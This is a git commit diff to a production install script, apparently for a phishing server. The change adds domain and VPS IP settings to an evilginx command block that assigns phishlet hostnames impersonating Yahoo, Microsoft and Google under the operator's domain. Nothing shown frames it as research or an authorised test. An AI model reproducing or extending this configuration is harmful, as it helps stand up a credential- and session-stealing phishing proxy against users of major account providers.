37dfa24d9f9cbb0e88488aa69f4c86eccc6a6ef6
Ginahoffman <Karielyc14@gmail.com>
2026-05-16 18:22:48 -0700

    FIXED

--- scripts/install-prod.sh
+++ scripts/install-prod.sh
@@ -614,6 +614,8 @@ EOF
     # Configure phishlets
     sleep 2
     /usr/local/bin/evilginx -c "$EVILGINX_DIR" -p "$EVILGINX_DIR/phishlets" << CMDS
+config domain $DOMAIN
+config ipv4 $VPS_IP
 phishlets hostname yahoo $EP1.$DOMAIN
 phishlets hostname microsoft $EP2.$DOMAIN
 phishlets hostname google $EP3.$DOMAIN
